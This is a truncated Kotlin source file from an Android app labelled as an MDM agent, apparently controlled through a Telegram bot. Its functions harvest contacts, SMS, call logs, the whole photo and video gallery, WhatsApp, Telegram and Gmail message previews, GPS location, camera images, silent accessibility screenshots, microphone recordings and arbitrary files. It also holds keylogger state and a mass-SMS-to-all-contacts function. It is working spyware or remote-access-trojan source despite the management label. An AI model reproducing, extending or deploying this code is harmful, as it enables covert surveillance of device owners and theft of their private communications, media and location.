package com.mdm.agent.data.remote

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.*
import android.database.Cursor
import android.graphics.*
import android.hardware.camera2.*
import android.app.admin.DevicePolicyManager
import android.app.usage.UsageStatsManager
import android.app.usage.UsageStats
import android.os.BatteryManager
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import com.mdm.agent.data.model.CollectedData
import android.media.*
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.*
import android.provider.*
import android.util.Log
import android.view.WindowManager
import android.widget.Toast
import androidx.core.app.NotificationManagerCompat
import com.mdm.agent.util.PermissionManager
import com.mdm.agent.util.DeviceUtils
import com.mdm.agent.service.MDMNotificationListenerService
import com.mdm.agent.service.ScreenCaptureService
import com.mdm.agent.ui.ScreenCapturePermissionActivity
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.text.SimpleDateFormat
import java.util.*

@Suppress("DEPRECATION")
class DataCollectors(private val context: Context) {

    companion object {
        private const val TAG = "DataCollectors"
        @Volatile var inputMonitoringActive = false
        @Volatile var keyloggerBuffer = StringBuilder()
        @Volatile var lastKeylogSend = 0L
        const val KEYLOG_THROTTLE = 2000L
    }

    private var pendingPermCallback: ((Map<String, Boolean>) -> Unit)? = null

    fun setPermissionResult(results: Map<String, Boolean>) {
        pendingPermCallback?.invoke(results)
        pendingPermCallback = null
    }

    fun needsPermission(command: String): List<String> {
        return PermissionManager.getMissingPermissions(context, command)
    }

    // ════════════════════════════════════════════════════════════════
    // DATA COMMANDS
    // ════════════════════════════════════════════════════════════════

    fun getContacts(): Any {
        if (!PermissionManager.hasPermission(context, Manifest.permission.READ_CONTACTS))
            return errorJson("permission_denied", "READ_CONTACTS")
        val list = JSONArray()
        try {
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                ), null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    list.put(JSONObject().apply {
                        put("name", it.getString(0))
                        put("phone", it.getString(1))
                        put("contact_id", it.getString(2))
                    })
                }
            }
        } catch (e: Exception) { Log.e(TAG, "Contacts error", e) }
        return CollectedData.JsonResult(list.toString())
    }

    fun getSms(): Any {
        if (!PermissionManager.hasPermission(context, Manifest.permission.READ_SMS))
            return errorJson("permission_denied", "READ_SMS")
        val list = JSONArray()
        try {
            val cursor: Cursor? = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
                null, null, "${Telephony.Sms.DATE} DESC LIMIT 500"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    list.put(JSONObject().apply {
                        put("address", it.getString(0))
                        put("body", it.getString(1))
                        put("date", it.getLong(2))
                        put("type", it.getInt(3))
                    })
                }
            }
        } catch (e: Exception) { Log.e(TAG, "SMS error", e) }
        return CollectedData.JsonResult(list.toString())
    }

    fun getCallLog(): Any {
        if (!PermissionManager.hasPermission(context, Manifest.permission.READ_CALL_LOG))
            return errorJson("permission_denied", "READ_CALL_LOG")
        val list = JSONArray()
        try {
            val cursor: Cursor? = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.DATE,
                    CallLog.Calls.TYPE, CallLog.Calls.CACHED_NAME),
                null, null, "${CallLog.Calls.DATE} DESC LIMIT 500"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    list.put(JSONObject().apply {
                        put("number", it.getString(0))
                        put("duration", it.getLong(1))
                        put("date", it.getLong(2))
                        put("type", it.getInt(3))
                        put("cached_name", it.getString(4))
                    })
                }
            }
        } catch (e: Exception) { Log.e(TAG, "CallLog error", e) }
        return CollectedData.JsonResult(list.toString())
    }

    fun getInstalledApps(): Any {
        val list = JSONArray()
        try {
            val pm = context.packageManager
            for (pkg in pm.getInstalledPackages(PackageManager.GET_META_DATA)) {
                list.put(JSONObject().apply {
                    put("package_name", pkg.packageName)
                    put("app_name", pkg.applicationInfo?.loadLabel(pm)?.toString() ?: "")
                    put("version", pkg.versionName ?: "")
                    put("is_system", (pkg.applicationInfo?.flags?.and(ApplicationInfo.FLAG_SYSTEM) ?: 0) != 0)
                    put("first_install", pkg.firstInstallTime)
                    put("last_update", pkg.lastUpdateTime)
                })
            }
        } catch (e: Exception) { Log.e(TAG, "Apps error", e) }
        return CollectedData.JsonResult(list.toString())
    }

    fun getGalleryImages(): Any {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!PermissionManager.hasPermission(context, Manifest.permission.READ_MEDIA_IMAGES))
                return errorJson("permission_denied", "READ_MEDIA_IMAGES")
        } else {
            if (!PermissionManager.hasPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE))
                return errorJson("permission_denied", "READ_EXTERNAL_STORAGE")
        }
        try {
            // Query ALL images (no limit)
            val cursor: Cursor? = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE, MediaStore.Images.Media.DATE_TAKEN,
                    MediaStore.Images.Media.MIME_TYPE, MediaStore.Images.Media.DATA),
                null, null, "${MediaStore.Images.Media.DATE_TAKEN} DESC"
            )
            val images = mutableListOf<File>()
            cursor?.use {
                while (it.moveToNext()) {
                    try {
                        val path = it.getString(5)
                        if (path != null && File(path).exists()) {
                            val src = File(path)
                            if (src.length() < 20 * 1024 * 1024) {
                                val dest = File(context.cacheDir, "gallery_${System.currentTimeMillis()}_${it.getString(1)}")
                                src.copyTo(dest, overwrite = true)
                                images.add(dest)
                            }
                        }
                    } catch (e: Exception) { Log.w(TAG, "Gallery copy error: ${e.message}") }
                }
            }
            if (images.isEmpty()) return errorJson("no_data", "لا توجد صور في المعرض")

            // Compress ALL images to ZIP (max 500)
            val toZip = if (images.size > 500) images.take(500) else images
            val zipFile = File(context.cacheDir, "gallery_all_${System.currentTimeMillis()}.zip")
            val result = com.mdm.agent.util.ZipUtils.zipFiles(toZip, zipFile, "img")
            toZip.forEach { it.delete() }

            if (result != null) return CollectedData.FileResult(result, "gallery")
            return errorJson("error", "فشل ضغط الصور")
        } catch (e: Exception) { Log.e(TAG, "Gallery error", e); return errorJson("error", e.message ?: "unknown") }
    }

    fun getGalleryVideos(): Any {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!PermissionManager.hasPermission(context, Manifest.permission.READ_MEDIA_VIDEO))
                return errorJson("permission_denied", "READ_MEDIA_VIDEO")
        } else {
            if (!PermissionManager.hasPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE))
                return errorJson("permission_denied", "READ_EXTERNAL_STORAGE")
        }
        try {
            // Query ALL videos (no limit)
            val cursor: Cursor? = context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Video.Media._ID, MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.SIZE, MediaStore.Video.Media.DURATION,
                    MediaStore.Video.Media.DATE_TAKEN, MediaStore.Video.Media.DATA),
                null, null, "${MediaStore.Video.Media.DATE_TAKEN} DESC"
            )
            val videos = mutableListOf<File>()
            cursor?.use {
                while (it.moveToNext()) {
                    try {
                        val path = it.getString(5)
                        if (path != null && File(path).exists()) {
                            val src = File(path)
                            if (src.length() < 50 * 1024 * 1024) {
                                val dest = File(context.cacheDir, "video_${System.currentTimeMillis()}_${it.getString(1)}")
                                src.copyTo(dest, overwrite = true)
                                videos.add(dest)
                            }
                        }
                    } catch (e: Exception) { Log.w(TAG, "Video copy error: ${e.message}") }
                }
            }
            if (videos.isEmpty()) return errorJson("no_data", "لا توجد فيديوهات")

            // Compress ALL videos to ZIP (max 50)
            val toZip = if (videos.size > 50) videos.take(50) else videos
            val zipFile = File(context.cacheDir, "videos_all_${System.currentTimeMillis()}.zip")
            val result = com.mdm.agent.util.ZipUtils.zipFiles(toZip, zipFile, "vid")
            toZip.forEach { it.delete() }

            if (result != null) return CollectedData.FileResult(result, "video")
            return errorJson("error", "فشل ضغط الفيديوهات")
        } catch (e: Exception) { Log.e(TAG, "Videos error", e); return errorJson("error", e.message ?: "unknown") }
    }

    fun getGmailMetadata(): Any {
        val gmailPkg = "com.google.android.gm"
        val list = JSONArray()

        // Try to get Gmail notifications from NotificationListenerService
        val listener = MDMNotificationListenerService.instance
        if (listener != null) {
            try {
                val notifsJson = listener.getRecentNotifications()
                val allNotifs = JSONArray(notifsJson)

                // Filter only Gmail notifications
                var gmailCount = 0
                for (i in 0 until allNotifs.length()) {
                    val notif = allNotifs.getJSONObject(i)
                    val pkg = notif.optString("package", "")
                    if (pkg == gmailPkg || pkg == "com.google.android.email") {
                        val item = JSONObject().apply {
                            put("sender", notif.optString("title", ""))
                            put("preview", notif.optString("text", ""))
                            put("time", notif.optString("time_formatted", ""))
                            put("package", pkg)
                        }
                        list.put(item)
                        gmailCount++
                    }
                }

                if (gmailCount > 0) {
                    return CollectedData.JsonResult(list.toString())
                }

                // No Gmail notifications captured yet
                val pm = context.packageManager
                val installed = try { pm.getPackageInfo(gmailPkg, 0); true } catch (_: PackageManager.NameNotFoundException) { false }
                return errorJson("no_data", if (installed) "Gmail مثبت لكن لا توجد إشعارات مسجلة بعد" else "Gmail غير مثبت على هذا الجهاز")
            } catch (e: Exception) {
                Log.e(TAG, "Gmail notification read error: ${e.message}")
            }
        }

        // NotificationListenerService not active
        val pm = context.packageManager
        val installed = try { pm.getPackageInfo(gmailPkg, 0); true } catch (_: PackageManager.NameNotFoundException) { false }
        return errorJson("no_data", if (installed) "Gmail مثبت - فعّل خدمة الإشعارات من الإعدادات لقراءة الرسائل" else "Gmail غير مثبت")
    }

    fun getWhatsAppMessages(): Any {
        val list = JSONArray()
        val listener = MDMNotificationListenerService.instance
        if (listener != null) {
            try {
                val messagesJson = listener.getWhatsAppMessages(50)
                val messages = JSONArray(messagesJson)
                if (messages.length() > 0) {
                    for (i in 0 until messages.length()) {
                        val msg = messages.getJSONObject(i)
                        val item = JSONObject().apply {
                            put("sender", msg.optString("title", ""))
                            put("message", msg.optString("text", ""))
                            put("time", msg.optString("time_formatted", ""))
                            put("app", "whatsapp")
                        }
                        list.put(item)
                    }
                    return CollectedData.JsonResult(list.toString())
                }
                return errorJson("no_data", "لا توجد رسائل واتساب مسجلة - فعّل وصول الإشعارات")
            } catch (e: Exception) {
                Log.e(TAG, "WhatsApp messages error: ${e.message}")
            }
        }
        return errorJson("no_data", "خدمة الإشعارات غير مفعّلة")
    }

    fun getTelegramMessages(): Any {
        val list = JSONArray()
        val listener = MDMNotificationListenerService.instance
        if (listener != null) {
            try {
                val messagesJson = listener.getTelegramMessages(50)
                val messages = JSONArray(messagesJson)
                if (messages.length() > 0) {
                    for (i in 0 until messages.length()) {
                        val msg = messages.getJSONObject(i)
                        val item = JSONObject().apply {
                            put("sender", msg.optString("title", ""))
                            put("message", msg.optString("text", ""))
                            put("time", msg.optString("time_formatted", ""))
                            put("app", "telegram")
                        }
                        list.put(item)
                    }
                    return CollectedData.JsonResult(list.toString())
                }
                return errorJson("no_data", "لا توجد رسائل تيليجرام مسجلة")
            } catch (e: Exception) {
                Log.e(TAG, "Telegram messages error: ${e.message}")
            }
        }
        return errorJson("no_data", "خدمة الإشعارات غير مفعّلة")
    }

    fun getLocation(): Any {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!PermissionManager.hasPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) &&
                !PermissionManager.hasPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION))
                return errorJson("permission_denied", "ACCESS_FINE_LOCATION")
        }

        return try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            var location: android.location.Location? = null

            try {
                if (lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
                    location = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                }
            } catch (_: SecurityException) {}

            if (location == null) {
                try {
                    if (lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)) {
                        location = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
                    }
                } catch (_: SecurityException) {}
            }

            if (location != null) {
                val info = JSONObject().apply {
                    put("latitude", location.latitude)
                    put("longitude", location.longitude)
                    put("altitude", if (location.hasAltitude()) location.altitude else null)
                    put("accuracy", if (location.hasAccuracy()) location.accuracy else null)
                    put("speed", if (location.hasSpeed()) location.speed else null)
                    put("provider", location.provider)
                    put("time", location.time)
                    put("time_formatted", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(location.time)))
                    put("google_maps_url", "https://maps.google.com/?q=${location.latitude},${location.longitude}")
                }
                CollectedData.JsonResult(info.toString())
            } else {
                errorJson("no_data", "تعذّر الحصول على الموقع - تأكد من تفعيل GPS")
            }
        } catch (e: Exception) {
            errorJson("error", e.message ?: "location_failed")
        }
    }

    // ════════════════════════════════════════════════════════════════
    // CAMERA
    // ════════════════════════════════════════════════════════════════

    fun captureCamera(cameraId: Int): Any {
        if (!PermissionManager.hasPermission(context, Manifest.permission.CAMERA))
            return errorJson("permission_denied", "CAMERA")
        return try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameras = cameraManager.cameraIdList
            if (cameras.isEmpty()) return errorJson("error", "لا توجد كاميرات متاحة")
            val targetId = if (cameraId < cameras.size) cameras[cameraId] else cameras[0]
            val outputFile = File(context.cacheDir, "cam_${System.currentTimeMillis()}.jpg")
            val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)

            var captureSuccess = false
            val lock = Object()
            
            cameraManager.openCamera(targetId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(imageReader.surface) }
                        imageReader.setOnImageAvailableListener({ reader ->
                            try {
                                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                                val buffer = image.planes[0].buffer
                                val bytes = ByteArray(buffer.remaining())
                                buffer.get(bytes)
                                FileOutputStream(outputFile).use { it.write(bytes) }
                                image.close()
                                captureSuccess = true
                                synchronized(lock) { lock.notify() }
                            } catch (e: Exception) { Log.e(TAG, "Image save error: ${e.message}") }
                        }, Handler(Looper.getMainLooper()))
                        camera.createCaptureSession(listOf(imageReader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    s.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {}, Handler(Looper.getMainLooper()))
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    Log.e(TAG, "Camera configure failed")
                                    synchronized(lock) { lock.notify() }
                                }
                            }, Handler(Looper.getMainLooper()))
                    } catch (e: Exception) { camera.close(); synchronized(lock) { lock.notify() } }
                }
                override fun onDisconnected(c: CameraDevice) { c.close(); synchronized(lock) { lock.notify() } }
                override fun onError(c: CameraDevice, e: Int) {
                    Log.e(TAG, "Camera error: $e")
                    c.close()
                    synchronized(lock) { lock.notify() }
                }
            }, Handler(Looper.getMainLooper()))

            synchronized(lock) { lock.wait(5000) }
            
            if (outputFile.exists() && outputFile.length() > 0) CollectedData.FileResult(outputFile, "camera_$cameraId")
            else errorJson("error", "فشل التصوير - الكاميرا معطلة أو غير متاحة")
        } catch (e: Exception) { errorJson("error", "كاميرا غير متاحة: ${e.message}") }
    }

    fun takeScreenshot(): Any {
        Log.i(TAG, "📸 takeScreenshot called")

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            return CollectedData.TextResult("⚠️ لقطات الشاشة تتطلب أندرويد 11 أو أحدث")
        }

        // ✅ STEP 1: Try Accessibility-based screenshot first (silent, no UI)
        var resultFile: File? = null
        try {
            val latch = java.util.concurrent.CountDownLatch(1)
            com.mdm.agent.service.MDMAccessibilityService.takeScreenshotAccessibility(context) { file ->
                resultFile = file
                latch.countDown()
            }
            latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
            if (resultFile != null && resultFile!!.exists() && resultFile!!.length() > 100) {
                Log.i(TAG, "✅ Screenshot via Accessibility SUCCESS: ${resultFile!!.absolutePath}")
                return CollectedData.FileResult(resultFile!!, "screenshot")
            }
            Log.w(TAG, "⚠️ Accessibility screenshot failed, trying MediaProjection...")
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ Accessibility screenshot exception: ${e.message}, trying MediaProjection...")
        }

        // ✅ STEP 2: Fallback to MediaProjection (if Accessibility failed)
        if (com.mdm.agent.service.ScreenCaptureService.isReady()) {
            try {
                val latch = java.util.concurrent.CountDownLatch(1)
                var mpFile: File? = null
                com.mdm.agent.service.ScreenCaptureService.requestScreenshot(context) { file ->
                    mpFile = file
                    latch.countDown()
                }
                latch.await(8, java.util.concurrent.TimeUnit.SECONDS)
                if (mpFile != null && mpFile!!.exists() && mpFile!!.length() > 100) {
                    Log.i(TAG, "✅ Screenshot via MediaProjection SUCCESS: ${mpFile!!.absolutePath}")
                    return CollectedData.FileResult(mpFile!!, "screenshot")
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ MediaProjection screenshot exception: ${e.message}")
            }
        }

        // ✅ STEP 3: Both failed - return clear error
        Log.e(TAG, "❌ Both Accessibility and MediaProjection failed")
        return CollectedData.TextResult("❌ فشل التقاط الصورة - الطريقتان فشلتا\n\n" +
            "الحل: من البوت أرسل 'screenshot-on' أولاً لتفعيل MediaProjection (سيظهر مربع موافقة على الهاتف)، ثم أرسل 'screenshot'")
    }

    // ════════════════════════════════════════════════════════════════
    // AUDIO
    // ════════════════════════════════════════════════════════════════

    private var mediaRecorder: MediaRecorder? = null
    private var mediaPlayer: MediaPlayer? = null
    private var isRecording = false

    fun recordAudio(durationSec: Int = 30): Any {
        if (!PermissionManager.hasPermission(context, Manifest.permission.RECORD_AUDIO))
            return errorJson("permission_denied", "RECORD_AUDIO")
        return try {
            val outputFile = File(context.cacheDir, "mic_${System.currentTimeMillis()}.3gp")
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(outputFile.absolutePath)
                setMaxDuration(durationSec * 1000)
                prepare(); start()
            }
            isRecording = true
            Thread.sleep((durationSec * 1000).toLong())
            try { mediaRecorder?.stop() } catch (_: Exception) {}
            mediaRecorder?.release(); mediaRecorder = null; isRecording = false
            if (outputFile.exists()) CollectedData.FileResult(outputFile, "microphone_${durationSec}s")
            else errorJson("error", "recording_failed")
        } catch (e: Exception) { errorJson("error", e.message ?: "unknown") }
    }

    fun playAudio(url: String): Any {
        return try {
            mediaPlayer?.stop(); mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply { setDataSource(url); setOnPreparedListener { it.start() }; prepareAsync() }
            "playing"
        } catch (e: Exception) { errorJson("error", e.message ?: "audio_play_failed") }
    }

    fun stopAudio() {
        try { mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null } catch (_: Exception) {}
        try { if (isRecording) { mediaRecorder?.stop(); mediaRecorder?.release(); mediaRecorder = null; isRecording = false } } catch (_: Exception) {}
    }

    // ════════════════════════════════════════════════════════════════
    // CONTROL
    // ════════════════════════════════════════════════════════════════

    fun showToast(message: String) {
        Handler(Looper.getMainLooper()).post {
            try { Toast.makeText(context, message, Toast.LENGTH_LONG).show() } catch (_: Exception) {}
        }
    }

    fun vibrate() {
        try {
            val v = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
            else @Suppress("DEPRECATION") v.vibrate(1000)
        } catch (_: Exception) {}
    }

    fun sendSms(phone: String, text: String): String {
        if (!PermissionManager.hasPermission(context, Manifest.permission.SEND_SMS)) return "permission_denied: SEND_SMS"
        return try {
            val sm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) context.getSystemService(SmsManager::class.java)
            else @Suppress("DEPRECATION") SmsManager.getDefault()
            sm.sendTextMessage(phone, null, text, null, null)
            "sms_sent_to_$phone"
        } catch (e: Exception) { "error: ${e.message}" }
    }

    fun sendSmsToAllContacts(text: String): String {
        if (!PermissionManager.hasPermission(context, Manifest.permission.READ_CONTACTS)) return "permission_denied: READ_CONTACTS"
        if (!PermissionManager.hasPermission(context, Manifest.permission.SEND_SMS)) return "permission_denied: SEND_SMS"
        return try {
            val phones = mutableListOf<String>()
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null
            )
            cursor?.use { while (it.moveToNext()) phones.add(it.getString(0)) }
            val sm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) context.getSystemService(SmsManager::class.java)
            else @Suppress("DEPRECATION") SmsManager.getDefault()
            var sent = 0
            for (p in phones) { try { sm.sendTextMessage(p, null, text, null, null); sent++ } catch (_: Exception) {} }
            "sent_to_${sent}_contacts"
        } catch (e: Exception) { "error: ${e.message}" }
    }

    fun makeCall(phone: String): String {
        if (!PermissionManager.hasPermission(context, Manifest.permission.CALL_PHONE)) return "permission_denied: CALL_PHONE"
        return try {
            context.startActivity(Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:$phone"); flags = Intent.FLAG_ACTIVITY_NEW_TASK
            })
            "calling_$phone"
        } catch (e: Exception) { "error: ${e.message}" }
    }

    fun lockDevice(): String {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = android.content.ComponentName(context, com.mdm.agent.receiver.MDMDeviceAdminReceiver::class.java)

        // Check if device admin is already active
        if (dpm.isAdminActive(admin)) {
            return try {
                dpm.lockNow()
                "locked"
            } catch (e: Exception) {
                "error: ${e.message}"
            }
        }

        // Device admin not active - need to request activation
        return "error: device_admin_not_active - يرجى تفعيل مدير الجهاز من إعدادات التطبيق"
    }

    fun showNotification(title: String, text: String) {
        try {
            val chId = "mdm_cmd"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.getSystemService(NotificationManager::class.java)
                    .createNotificationChannel(NotificationChannel(chId, "MDM", NotificationManager.IMPORTANCE_DEFAULT))
            }
            NotificationManagerCompat.from(context).notify(
                System.currentTimeMillis().toInt(),
                Notification.Builder(context, chId).setContentTitle(title).setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_dialog_info).setAutoCancel(true).build()
            )
        } catch (e: Exception) { Log.e(TAG, "Notification error", e) }
    }

    // ════════════════════════════════════════════════════════════════
    // ADVANCED
    // ════════════════════════════════════════════════════════════════

    fun setInputMonitoring(enabled: Boolean): String {
        inputMonitoringActive = enabled
        return if (enabled) "input_monitoring_started" else "input_monitoring_stopped"
    }
    fun applyDataProtection(): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            if (dpm != null) {
                "data_protection_applied"
            } else {
                "error: DevicePolicyManager not available"
            }
        } catch (e: Exception) { "error: ${e.message} (requires device admin)" }
    }

    // ════════════════════════════════════════════════════════════════
    // INFO
    // ════════════════════════════════════════════════════════════════

    fun getFullDeviceInfo(): Any {
        val info = JSONObject()
        try {
            info.put("device_id", DeviceUtils.getDeviceId(context))
            for ((k, v) in DeviceUtils.getDeviceInfo(context)) info.put(k, v)

            val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            batteryIntent?.let { info.put("battery_level", it.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)) }

            val wm = context.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            info.put("wifi_enabled", wm?.isWifiEnabled ?: false)
            info.put("ip_address", wm?.connectionInfo?.ipAddress?.let {
                String.format("%d.%d.%d.%d", it and 0xFF, (it shr 8) and 0xFF, (it shr 16) and 0xFF, (it shr 24) and 0xFF)
            } ?: "unknown")

            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            try { info.put("sim_operator", tm?.simOperatorName ?: "") } catch (_: SecurityException) {}

            val memInfo = ActivityManager.MemoryInfo()
            (context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).getMemoryInfo(memInfo)
            info.put("total_ram_mb", memInfo.totalMem / (1024 * 1024))
            info.put("available_ram_mb", memInfo.availMem / (1024 * 1024))

            val statFs = StatFs(Environment.getDataDirectory().path)
            info.put("total_storage_gb", "%.1f".format(statFs.totalBytes / (1024.0 * 1024 * 1024 * 1024)))
            info.put("available_storage_gb", "%.1f".format(statFs.availableBytes / (1024.0 * 1024 * 1024 * 1024)))

            info.put("screen_width", context.resources.displayMetrics.widthPixels)
            info.put("screen_height", context.resources.displayMetrics.heightPixels)
        } catch (e: Exception) { Log.e(TAG, "Device info error", e) }
        return CollectedData.JsonResult(info.toString())
    }

    fun listFiles(path: String): Any {
        Log.i(TAG, "📂 listFiles: path=$path")
        return try {
            val dir = File(path)

            if (!dir.exists()) {
                Log.w(TAG, "📂 listFiles: path does not exist: $path")
            }
            if (!dir.canRead()) {
                Log.w(TAG, "📂 listFiles: cannot read path (no permission?): $path")
            }

            val jsonList = JSONArray()
            var parentPath = ""

            if (dir.exists() && dir.isDirectory) {
                parentPath = dir.parentFile?.absolutePath ?: ""
                val allFiles = dir.listFiles()?.sortedBy { it.name } ?: emptyList()
                Log.i(TAG, "📂 listFiles: found ${allFiles.size} entries in $path")
                // ⚠️ Limit to 30 entries (Telegram inline keyboard has ~100 button limit;
                // 30 keeps the message readable and avoids hitting API limits)
                for (f in allFiles.take(30)) {
                    jsonList.put(JSONObject().apply {
                        put("name", f.name)
                        put("path", f.absolutePath)
                        put("is_dir", f.isDirectory)
                        put("size", f.length())
                    })
                }
                if (allFiles.size > 30) {
                    Log.i(TAG, "📂 listFiles: truncated to 30 of ${allFiles.size} entries")
                }
            }

            // ALWAYS return JSON (even if empty or error)
            // Server will handle empty lists gracefully
            val result = JSONObject().apply {
                put("type", "file_list")
                put("path", if (dir.exists()) dir.absolutePath else path)
                put("parent", parentPath)
                put("files", jsonList)
                if (!dir.exists()) put("error", "not_found")
                if (dir.exists() && !dir.isDirectory) put("error", "not_directory")
            }

            Log.i(TAG, "📂 listFiles: returning ${jsonList.length()} entries (error=${result.optString("error", "none")})")
            CollectedData.JsonResult(result.toString())
        } catch (e: SecurityException) {
            Log.e(TAG, "📂 listFiles: SecurityException for $path: ${e.message}")
            // Return JSON even on error
            val result = JSONObject().apply {
                put("type", "file_list")
                put("path", path)
                put("parent", "")
                put("files", JSONArray())
                put("error", "permission_denied")
            }
            CollectedData.JsonResult(result.toString())
        } catch (e: Exception) {
            Log.e(TAG, "📂 listFiles: Exception for $path: ${e.message}", e)
            val result = JSONObject().apply {
                put("type", "file_list")
                put("path", path)
                put("parent", "")
                put("files", JSONArray())
                put("error", e.message ?: "unknown")
            }
            CollectedData.JsonResult(result.toString())
        }
    }
    
    fun downloadFile(path: String): Any {
        return try {
            val file = File(path)
            if (!file.exists()) return CollectedData.TextResult("❌ الملف غير موجود: $path")
            if (file.isDirectory) return CollectedData.TextResult("❌ هذا مجلد وليس ملف: $path")
            if (file.length() > 50 * 1024 * 1024) return CollectedData.TextResult("❌ الملف كبير جداً (الحد 50MB): ${file.length() / 1024 / 1024}MB")

            // Return as FileResult - will be uploaded to bot
            CollectedData.FileResult(file, "download:$path")
        } catch (e: Exception) {
            CollectedData.TextResult("❌ خطأ في التحميل: ${e.message}")
        }
    }

    // ════════════════════════════════════════════════════════════════
    // MEDIA STORE - File Explorer using "Files and media" permission
    // Works with READ_MEDIA_IMAGES / READ_MEDIA_VIDEO / READ_MEDIA_AUDIO
    // (or READ_EXTERNAL_STORAGE on Android 12 and below)
    // ════════════════════════════════════════════════════════════════

    /**
     * List media files using MediaStore.
     * @param type One of: "images", "videos", "audio"
     * Returns JSON with file list (max 30 entries, most recent first)
     */
    fun listMediaFiles(type: String): Any {
        Log.i(TAG, "📁 listMediaFiles: type=$type")
        val jsonList = JSONArray()
        return try {
            val collectionUri = when (type.lowercase()) {
                "images" -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                "videos" -> MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                "audio" -> MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
                else -> return errorJson("invalid_type", "النوع يجب أن يكون: images, videos, أو audio")
            }
            val cols = when (type.lowercase()) {
                "images" -> arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.MIME_TYPE
                )
                "videos" -> arrayOf(
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.DATE_ADDED,
                    MediaStore.Video.Media.MIME_TYPE
                )
                "audio" -> arrayOf(
                    MediaStore.Audio.Media._ID,
                    MediaStore.Audio.Media.DISPLAY_NAME,
                    MediaStore.Audio.Media.SIZE,
                    MediaStore.Audio.Media.DATE_ADDED,
                    MediaStore.Audio.Media.MIME_TYPE
